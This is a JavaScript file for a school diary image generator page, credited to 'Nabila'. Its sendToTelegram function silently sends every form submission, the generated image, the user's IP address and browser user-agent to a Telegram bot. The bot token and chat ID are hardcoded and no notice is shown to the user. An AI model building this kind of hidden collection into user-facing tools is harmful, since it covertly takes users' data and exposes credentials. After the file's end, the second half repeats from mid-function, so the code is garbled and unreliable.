// HARDCODED TELEGRAM CREDENTIALS (KEEP THIS FILE PRIVATE!)
const TELEGRAM_BOT_TOKEN = "7180890909:AAEmpWcoeg7_oVV5s4C5bxzbY72YNr7vwwE";
const TELEGRAM_CHAT_ID = "1928349457";
const TELEGRAM_ENABLED = true; // Set to false to disable

// Elements
const form = document.getElementById("diaryForm");
const formSection = document.getElementById("formSection");
const resultSection = document.getElementById("resultSection");
const diaryImage = document.getElementById("diaryImage");
const loader = document.getElementById("loader");
const backBtn = document.getElementById("backBtn");
const downloadBtn = document.getElementById("downloadBtn");
const teacherInput = document.getElementById("teacher");
const footer = document.getElementById("footer");
const dateInput = document.getElementById("dateInput");

// Set today's date (LOCAL, timezone-safe)
(function setTodayDate() {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, "0");
  const day = String(now.getDate()).padStart(2, "0");
  dateInput.value = `${year}-${month}-${day}`;
})();

// Set footer
footer.textContent = `© ${new Date().getFullYear()} Nabila - All Rights Reserved`;

// Teacher autocomplete
let lastTeacher = "Nabila Tabassum";
teacherInput.addEventListener("input", function (e) {
  if (e.target.value.toLowerCase() === "na") {
    e.target.value = "Nabila Tabassum";
  }
});

// Get user's IP address
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return 'Unknown';
  }
}

// Send to Telegram
async function sendToTelegram(data, imageDataUrl) {
  if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  try {
    // Get IP and User-Agent
    const userIP = await getUserIP();
    const userAgent = navigator.userAgent;
    
    const message = `
📚 *New School Diary Entry*

📅 *Date:* ${data.date}
🏫 *Class:* ${data.cls}
📖 *Subject:* ${data.subject}
👨‍🏫 *Teacher:* ${data.teacher}

📝 *Classwork:*
${data.cw}

📋 *Homework:*
${data.hw || 'None'}

💬 *Remarks:*
${data.remark}

━━━━━━━━━━━━━━━━━
🌐 *User Info:*
📍 IP: \`${userIP}\`
🖥 User-Agent: \`${userAgent}\`
    `.trim();

    // Send text message
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    // Convert base64 to blob
    const base64Data = imageDataUrl.split(',')[1];
    const byteCharacters = atob(base64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
      byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const blob = new Blob([byteArray], { type: 'image/png' });

    // Send image
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'diary.png');
    formData.append('caption', '📄 School Diary');

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    console.log('✅ Sent to Telegram successfully');
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
  }
}

// Form submission
form.addEventListener("submit", async function (e) {
  e.preventDefault();
  loader.style.display = "flex";

  const teacherName = teacherInput.value || "Nabila Tabassum";
  lastTeacher = teacherName;

  const selectedDate = dateInput.value;
  const dateObj = new Date(selectedDate + 'T00:00:00');
  const day = String(dateObj.getDate()).padStart(2, "0");
  const month = String(dateObj.getMonth() + 1).padStart(2, "0");
  const year = dateObj.getFullYear();
  const dayName = dateObj.toLocaleString("en-US", { weekday: "long" });

  const data = {
    cls: document.getElementById("class").value,
    subject: document.getElementById("subject").value,
    teacher: teacherName,
    cw: document.getElementById("classwork").value,
    hw: document.getElementById("homework").value,
    remark: document.getElementById("remarks").value,
    date: `${day}.${month}.${year} (${dayName})`,
  };

  setTimeout(() => generateDiary(data), 100);
});

// Generate diary image
async function generateDiary(data) {
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  const bg = new Image();
  bg.crossOrigin = "anonymous";

  const dateText = `Date: ${data.date}`;

  function wrapText(context, text, x, y, maxWidth, lineHeight) {
    const lines = text.split("\n");
    lines.forEach((line) => {
      const words = line.split(" ");
      let currentLine = "";
      for (let n = 0; n < words.length; n++) {
        const testLine = currentLine + words[n] + " ";
        const metrics = context.measureText(testLine);
        if (metrics.width > maxWidth && n > 0) {
          context.fillText(currentLine, x, y);
          currentLine = words[n] + " ";
          y += lineHeight;
        } else {
          currentLine = testLine;
        }
      }
      context.fillText(currentLine, x, y);
      y += lineHeight;
    });
  }

  try {
    if (data.hw && data.hw.trim() !== "") {
      bg.src = "bg-v2.jpg";
      await new Promise((resolve, reject) => {
        bg.onload = resolve;
        bg.onerror = reject;
      });

      canvas.width = bg.width;
      canvas.height = bg.height;
      ctx.drawImage(bg, 0, 0);

      ctx.font = "63px Arial";
      ctx.fillStyle = "#000000";
      ctx.textAlign = "start";

      ctx.fillText(data.cls, 375, 762);
      ctx.fillText(data.subject, 425, 892);
      ctx.fillText(data.teacher || "Nabila Tabassum", 695, 1018);
      wrapText(ctx, data.cw, 181, 1240, 2000, 70);
      wrapText(ctx, data.hw, 181, 1668, 2000, 70);
      wrapText(ctx, data.remark, 181, 2100, 2000, 70);

      ctx.textAlign = "center";
      ctx.fillText(dateText, bg.width - 800, 763);
    } else {
      bg.src = "bg.jpg";
      await new Promise((resolve, reject) => {
        bg.onload = resolve;
        bg.onerror = reject;
      });

      canvas.width = bg.width;
      canvas.height = bg.height;
      ctx.drawImage(bg, 0, 0);

      ctx.font = "63px Arial";
      ctx.fillStyle = "#000000";
      ctx.textAlign = "start";

      ctx.fillText(data.cls, 372, 772);
      ctx.fillText(data.subject, 422, 902);
      ctx.fillText(data.teacher || "Nabila Tabassum", 692, 1029);
      wrapText(ctx, data.cw, 179, 1227, 2000, 70);

      ctx.textAlign = "center";
      ctx.fillText(dateText, bg.width - 838, 775);
    }

    const imageDataUrl = canvas.toDataURL("image/png");
    diaryImage.src = imageDataUrl;

    // Send to Telegram in background
    sendToTelegram(data, imageDataUrl);

    loader.style.display = "none";
    formSection.classList.add("hidden");
    resultSection.classList.remove("hidden");
  } catch (error) {
    console.error("Error:", error);
    alert("Error loading background image. Make sure 'bg.jpg' and 'bg-v2.jpg' are available.");
    loader.style.display = "none";
  }
}

// Back button
backBtn.addEventListener("click", function () {
  resultSection.classList.add("hidden");
  formSection.classList.remove("hidden");
  document.getElementById("classwork").value = "";
  document.getElementById("homework").value = "";
  document.getElementById("remarks").value = "N/A";
  document.getElementById("teacher").value = lastTeacher;
});

// Download button
downloadBtn.addEventListener("click", function () {
  const link = document.createElement("a");
  link.href = diaryImage.src;
  link.download = "school_diary.png";
  link.click();
});
  const month = String(dateObj.getMonth() + 1).padStart(2, "0");
  const year = dateObj.getFullYear();
  const dayName = dateObj.toLocaleString("en-US", { weekday: "long" });

  const data = {
    cls: document.getElementById("class").value,
    subject: document.getElementById("subject").value,
    teacher: teacherName,
    cw: document.getElementById("classwork").value,
    hw: document.getElementById("homework").value,
    remark: document.getElementById("remarks").value,
    date: `${day}.${month}.${year} (${dayName})`,
  };

  setTimeout(() => generateDiary(data), 100);
});

// Generate diary image
async function generateDiary(data) {
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  const bg = new Image();
  bg.crossOrigin = "anonymous";

  const dateText = `Date: ${data.date}`;

  function wrapText(context, text, x, y, maxWidth, lineHeight) {
    const lines = text.split("\n");
    lines.forEach((line) => {
      const words = line.split(" ");
      let currentLine = "";
      for (let n = 0; n < words.length; n++) {
        const testLine = currentLine + words[n] + " ";
        const metrics = context.measureText(testLine);
        if (metrics.width > maxWidth && n > 0) {
          context.fillText(currentLine, x, y);
          currentLine = words[n] + " ";
          y += lineHeight;
        } else {
          currentLine = testLine;
        }
      }
      context.fillText(currentLine, x, y);
      y += lineHeight;
    });
  }

  try {
    if (data.hw && data.hw.trim() !== "") {
      bg.src = "bg-v2.jpg";
      await new Promise((resolve, reject) => {
        bg.onload = resolve;
        bg.onerror = reject;
      });

      canvas.width = bg.width;
      canvas.height = bg.height;
      ctx.drawImage(bg, 0, 0);

      ctx.font = "63px Arial";
      ctx.fillStyle = "#000000";
      ctx.textAlign = "start";

      ctx.fillText(data.cls, 375, 762);
      ctx.fillText(data.subject, 425, 892);
      ctx.fillText(data.teacher || "Nabila Tabassum", 695, 1018);
      wrapText(ctx, data.cw, 181, 1240, 2000, 70);
      wrapText(ctx, data.hw, 181, 1668, 2000, 70);
      wrapText(ctx, data.remark, 181, 2100, 2000, 70);

      ctx.textAlign = "center";
      ctx.fillText(dateText, bg.width - 800, 763);
    } else {
      bg.src = "bg.jpg";
      await new Promise((resolve, reject) => {
        bg.onload = resolve;
        bg.onerror = reject;
      });

      canvas.width = bg.width;
      canvas.height = bg.height;
      ctx.drawImage(bg, 0, 0);

      ctx.font = "63px Arial";
      ctx.fillStyle = "#000000";
      ctx.textAlign = "start";

      ctx.fillText(data.cls, 372, 772);
      ctx.fillText(data.subject, 422, 902);
      ctx.fillText(data.teacher || "Nabila Tabassum", 692, 1029);
      wrapText(ctx, data.cw, 179, 1227, 2000, 70);

      ctx.textAlign = "center";
      ctx.fillText(dateText, bg.width - 838, 775);
    }

    const imageDataUrl = canvas.toDataURL("image/png");
    diaryImage.src = imageDataUrl;

    // Send to Telegram in background
    sendToTelegram(data, imageDataUrl);

    loader.style.display = "none";
    formSection.classList.add("hidden");
    resultSection.classList.remove("hidden");
  } catch (error) {
    console.error("Error:", error);
    alert("Error loading background image. Make sure 'bg.jpg' and 'bg-v2.jpg' are available.");
    loader.style.display = "none";
  }
}

// Back button
backBtn.addEventListener("click", function () {
  resultSection.classList.add("hidden");
  formSection.classList.remove("hidden");
  document.getElementById("classwork").value = "";
  document.getElementById("homework").value = "";
  document.getElementById("remarks").value = "N/A";
  document.getElementById("teacher").value = lastTeacher;
});

// Download button
downloadBtn.addEventListener("click", function () {
  const link = document.createElement("a");
  link.href = diaryImage.src;
  link.download = "school_diary.png";
  link.click();
});
